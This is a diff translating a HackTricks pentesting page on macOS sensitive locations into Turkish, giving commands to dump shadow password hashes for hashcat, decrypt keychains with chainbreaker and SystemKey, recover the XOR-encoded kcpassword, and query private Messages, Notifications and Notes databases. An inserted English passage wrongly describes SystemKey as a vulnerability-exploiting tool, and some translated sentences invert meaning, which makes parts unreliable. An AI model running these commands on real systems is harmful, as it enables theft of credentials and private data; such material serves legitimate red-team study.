@@ -1,25 +1,25 @@
-# macOS Sensitive Locations
+# macOS Hassas Konumlar
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>AWS hacklemeyi sıfırdan kahraman olmak için öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+HackTricks'i desteklemenin diğer yolları:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Şirketinizi HackTricks'te **reklamını görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
+* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
+* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
+* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'ı takip edin**.
+* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR göndererek paylaşın**.
 
 </details>
 
-## Passwords
+## Parolalar
 
-### Shadow Passwords
+### Shadow Parolaları
 
-Shadow password is stored with the user's configuration in plists located in **`/var/db/dslocal/nodes/Default/users/`**.\
-The following oneliner can be use to dump **all the information about the users** (including hash info):
+Shadow parolaları, kullanıcının yapılandırmasıyla birlikte **`/var/db/dslocal/nodes/Default/users/`** konumunda bulunan plist dosyalarında depolanır.\
+Aşağıdaki oneliner, **kullanıcılar hakkında tüm bilgileri** (hash bilgileri dahil) dökmek için kullanılabilir:
 
 {% code overflow="wrap" %}
 ```bash
@@ -27,9 +27,9 @@ for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"
 ```
 {% endcode %}
 
-[**Scripts like this one**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) or [**this one**](https://github.com/octomagon/davegrohl.git) can be used to transform the hash to **hashcat** **format**.
+[**Bu gibi betikler**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) veya [**bu gibi**](https://github.com/octomagon/davegrohl.git) kullanılarak hash'i **hashcat** **formatına** dönüştürmek için kullanılabilir.
 
-An alternative one-liner which will dump creds of all non-service accounts in hashcat format `-m 7100` (macOS PBKDF2-SHA512):
+Tüm hizmet hesaplarının olmayan kullanıcıların kimlik bilgilerini `-m 7100` (macOS PBKDF2-SHA512) hashcat formatında dökümleyen alternatif bir tek satırlık komut: 
 
 {% code overflow="wrap" %}
 ```bash
@@ -37,10 +37,9 @@ sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex
 ```
 {% endcode %}
 
-### Keychain Dump
+### Anahtar Zinciri Dökümü
 
-Note that when using the security binary to **dump the passwords decrypted**, several prompts will ask the user to allow this operation.
-
+Not: Şifreleri çözülmüş olarak dökmek için security binary'sini kullanırken, kullanıcıya bu işlemi yapmasına izin vermesi için birkaç uyarı gelecektir.
 ```bash
 #security
 secuirty dump-trust-settings [-s] [-d] #List certificates
@@ -49,56 +48,57 @@ security list-smartcards #List smartcards
 security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
 security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
 ```
-
 ### [Keychaindump](https://github.com/juuso/keychaindump)
 
 {% hint style="danger" %}
-Based on this comment [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) it looks like these tools aren't working anymore in Big Sur.
+Bu yorumdan [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) yola çıkarak, bu araçların Big Sur'da artık çalışmadığı görünüyor.
 {% endhint %}
 
-### Keychaindump Overview
+### Keychaindump Genel Bakışı
 
-A tool named **keychaindump** has been developed to extract passwords from macOS keychains, but it faces limitations on newer macOS versions like Big Sur, as indicated in a [discussion](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760). The use of **keychaindump** requires the attacker to gain access and escalate privileges to **root**. The tool exploits the fact that the keychain is unlocked by default upon user login for convenience, allowing applications to access it without requiring the user's password repeatedly. However, if a user opts to lock their keychain after each use, **keychaindump** becomes ineffective.
+**keychaindump** adında bir araç, macOS anahtar zincirlerinden şifreleri çıkarmak için geliştirilmiştir, ancak Big Sur gibi daha yeni macOS sürümlerinde sınırlamalarla karşılaşır, [tartışmada](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) belirtildiği gibi. **keychaindump**'ın kullanımı, saldırganın **root** erişimi elde etmesi ve ayrıcalıkları yükseltmesi gerektirir. Araç, anahtar zincirinin kullanıcı girişiyle varsayılan olarak kilidini açık tutması nedeniyle uygulamaların kullanıcı şifresini tekrar tekrar sormadan erişmesine olanak tanır. Ancak, bir kullanıcının her kullanımdan sonra anahtar zincirini kilitlemeyi tercih etmesi durumunda, **keychaindump** etkisiz hale gelir.
 
-**Keychaindump** operates by targeting a specific process called **securityd**, described by Apple as a daemon for authorization and cryptographic operations, crucial for accessing the keychain. The extraction process involves identifying a **Master Key** derived from the user's login password. This key is essential for reading the keychain file. To locate the **Master Key**, **keychaindump** scans the memory heap of **securityd** using the `vmmap` command, looking for potential keys within areas flagged as `MALLOC_TINY`. The following command is used to inspect these memory locations:
-
+**Keychaindump**, Apple tarafından yetkilendirme ve şifreleme işlemleri için kritik olan bir **securityd** adlı özel bir işlemi hedef alarak çalışır. Çıkarma işlemi, kullanıcının giriş şifresinden türetilen bir **Anahtar Anahtarı**'nı belirlemeyi içerir. Bu anahtar, anahtar zinciri dosyasını okumak için önemlidir. **Keychaindump**, potansiyel anahtarları **MALLOC_TINY** olarak işaretlenen alanlarda arayan `vmmap` komutunu kullanarak **securityd**'nin bellek yığını üzerinde tarama yapar. Bu bellek konumlarını incelemek için aşağıdaki komut kullanılır:
 ```bash
 sudo vmmap <securityd PID> | grep MALLOC_TINY
 ```
-
-After identifying potential master keys, **keychaindump** searches through the heaps for a specific pattern (`0x0000000000000018`) that indicates a candidate for the master key. Further steps, including deobfuscation, are required to utilize this key, as outlined in **keychaindump**'s source code. Analysts focusing on this area should note that the crucial data for decrypting the keychain is stored within the memory of the **securityd** process. An example command to run **keychaindump** is:
-
+Potansiyel anahtarları belirledikten sonra, **keychaindump**, anahtar adayını gösteren (`0x0000000000000018`) belirli bir deseni aramak için heap'leri tarar. Bu anahtarı kullanmak için, **keychaindump**'ın kaynak kodunda belirtildiği gibi, deobfuscation gibi ilave adımlar gereklidir. Bu alana odaklanan analistler, anahtar zincirini şifrelemek için önemli verilerin **securityd** işleminin belleğinde depolandığını unutmamalıdır. **keychaindump**'ı çalıştırmak için bir örnek komut:
 ```bash
 sudo ./keychaindump
 ```
-
-
 ### chainbreaker
 
-[**Chainbreaker**](https://github.com/n0fate/chainbreaker) can be used to extract the following types of information from an OSX keychain in a forensically sound manner:
+[**Chainbreaker**](https://github.com/n0fate/chainbreaker), aşağıdaki türdeki bilgileri OSX anahtar zincirinden forensik olarak çıkarmanızı sağlar:
 
-* Hashed Keychain password, suitable for cracking with [hashcat](https://hashcat.net/hashcat/) or [John the Ripper](https://www.openwall.com/john/)
-* Internet Passwords
-* Generic Passwords
-* Private Keys
-* Public Keys
-* X509 Certificates
-* Secure Notes
-* Appleshare Passwords
+* Hashlenmiş Anahtar Zinciri şifresi, [hashcat](https://hashcat.net/hashcat/) veya [John the Ripper](https://www.openwall.com/john/) ile kırılmak için uygundur.
+* İnternet Şifreleri
+* Genel Şifreler
+* Özel Anahtarlar
+* Genel Anahtarlar
+* X509 Sertifikaları
+* Güvenli Notlar
+* Appleshare Şifreleri
 
-Given the keychain unlock password, a master key obtained using [volafox](https://github.com/n0fate/volafox) or [volatility](https://github.com/volatilityfoundation/volatility), or an unlock file such as SystemKey, Chainbreaker will also provide plaintext passwords.
+Anahtar zinciri kilidini açma şifresi, [volafox](https://github.com/n0fate/volafox) veya [volatility](https://github.com/volatilityfoundation/volatility) ile elde edilen bir anahtar veya SystemKey gibi bir açma dosyası ile birlikte, Chainbreaker ayrıca düz metin şifreler sağlar.
 
-Without one of these methods of unlocking the Keychain, Chainbreaker will display all other available information.
+Anahtar Zincirini kilitlemek için bu yöntemlerden birine sahip olmadan, Chainbreaker diğer tüm mevcut bilgileri görüntüler.
 
-#### **Dump keychain keys**
-
+#### **Anahtar zinciri anahtarlarını dökün**
 ```bash
 #Dump all keys of the keychain (without the passwords)
 python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
 ```
+#### **SystemKey ile anahtar zinciri anahtarlarını (şifreleriyle birlikte) dökün**
 
-#### **Dump keychain keys (with passwords) with SystemKey**
+SystemKey is a tool that can be used to dump keychain keys, including passwords, from a macOS system. It takes advantage of a vulnerability in the macOS keychain system to extract sensitive information.
 
+To use SystemKey, follow these steps:
+
+1. Download and compile the SystemKey tool from the official GitHub repository.
+2. Run the SystemKey tool with administrative privileges.
+3. The tool will automatically search for and dump all keychain keys, including passwords, to a file.
+
+Please note that using SystemKey to dump keychain keys is considered a privilege escalation technique and may be illegal or unethical without proper authorization. Always ensure you have the necessary permissions and legal rights before attempting any hacking or penetration testing activities.
 ```bash
 # First, get the keychain decryption key
 # To get this decryption key you need to be root and SIP must be disabled
@@ -106,9 +106,7 @@ hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
 ## Use the previous key to decrypt the passwords
 python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
 ```
-
-#### **Dump keychain keys (with passwords) cracking the hash**
-
+#### **Anahtarlık anahtarlarını (şifreleriyle birlikte) hash'i kırarak dökün**
 ```bash
 # Get the keychain hash
 python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
@@ -117,11 +115,9 @@ hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
 # Use the key to decrypt the passwords
 python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
 ```
+#### **Bellek dökümü ile anahtar zinciri anahtarlarını (parolalarla birlikte) dökün**
 
-#### **Dump keychain keys (with passwords) with memory dump**
-
-[Follow these steps](..#dumping-memory-with-osxpmem) to perform a **memory dump**
-
+Bir **bellek dökümü** gerçekleştirmek için [şu adımları takip edin](..#osxpmem-ile-bellek-dökümü-yapma)
 ```bash
 #Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
 # Unformtunately volafox isn't working with the latest versions of MacOS
@@ -130,27 +126,23 @@ python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump
 #Try to extract the passwords using the extracted keychain passwords
 python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
 ```
+#### **Kullanıcı şifresini kullanarak anahtar zinciri anahtarlarını (şifreleriyle birlikte) dökün**
 
-#### **Dump keychain keys (with passwords) using users password**
-
-If you know the users password you can use it to **dump and decrypt keychains that belong to the user**.
-
+Kullanıcının şifresini biliyorsanız, bunu kullanarak kullanıcıya ait anahtar zincirlerini döküp şifreleyebilirsiniz.
 ```bash
 #Prompt to ask for the password
 python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
 ```
-
 ### kcpassword
 
-The **kcpassword** file is a file that holds the **user’s login password**, but only if the system owner has **enabled automatic login**. Therefore, the user will be automatically logged in without being asked for a password (which isn't very secure).
+**kcpassword** dosyası, sistem sahibi **otomatik girişi etkinleştirdiyse** kullanıcının giriş şifresini tutan bir dosyadır. Bu nedenle, kullanıcıya şifre sorulmadan otomatik olarak giriş yapılır (bu çok güvenli değildir).
 
-The password is stored in the file **`/etc/kcpassword`** xored with the key **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`**. If the users password is longer than the key, the key will be reused.\
-This makes the password pretty easy to recover, for example using scripts like [**this one**](https://gist.github.com/opshope/32f65875d45215c3677d).
+Şifre, **`/etc/kcpassword`** dosyasında **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`** anahtarıyla xorlanmış olarak saklanır. Kullanıcının şifresi anahtardan daha uzunsa, anahtar tekrar kullanılır.\
+Bu, şifrenin oldukça kolay bir şekilde kurtarılmasını sağlar, örneğin [**bu gibi**](https://gist.github.com/opshope/32f65875d45215c3677d) betikler kullanılarak.
 
-## Interesting Information in Databases
+## Veritabanlarında İlginç Bilgiler
 
-### Messages
-
+### Mesajlar
 ```bash
 sqlite3 $HOME/Library/Messages/chat.db .tables
 sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
@@ -158,25 +150,22 @@ sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
 sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
 sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
 ```
+### Bildirimler
 
-### Notifications
+Bildirim verilerini `$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/` konumunda bulabilirsiniz.
 
-You can find the Notifications data in `$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/`
-
-Most of the interesting information is going to be in **blob**. So you will need to **extract** that content and **transform** it to **human** **readable** or use **`strings`**. To access it you can do:
+İlginç bilgilerin çoğu **blob** içinde olacak. Bu nedenle, içeriği **çıkarmak** ve **insan tarafından okunabilir** hale getirmek veya **`strings`** kullanmak gerekecektir. Buna erişmek için şunları yapabilirsiniz:
 
 {% code overflow="wrap" %}
 ```bash
 cd $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/
 strings $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db | grep -i -A4 slack
 ```
+### Notlar
+
+Kullanıcıların **notları**, `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite` içinde bulunabilir.
+
 {% endcode %}
-
-### Notes
-
-The users **notes** can be found in `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`
-
-{% code overflow="wrap" %}
 ```bash
 sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables
 
@@ -187,14 +176,14 @@ for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.s
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>AWS hackleme becerilerini sıfırdan kahraman seviyesine öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+HackTricks'ı desteklemenin diğer yolları:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* **Şirketinizi HackTricks'te reklamını görmek isterseniz** veya **HackTricks'i PDF olarak indirmek isterseniz** [**ABONELİK PLANLARINA**](https://github.com/sponsors/carlospolop) göz atın!
+* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
+* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
+* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'ı takip edin**.
+* **Hacking hilelerinizi HackTricks ve HackTricks Cloud** github depolarına **PR göndererek paylaşın**.
 
 </details>
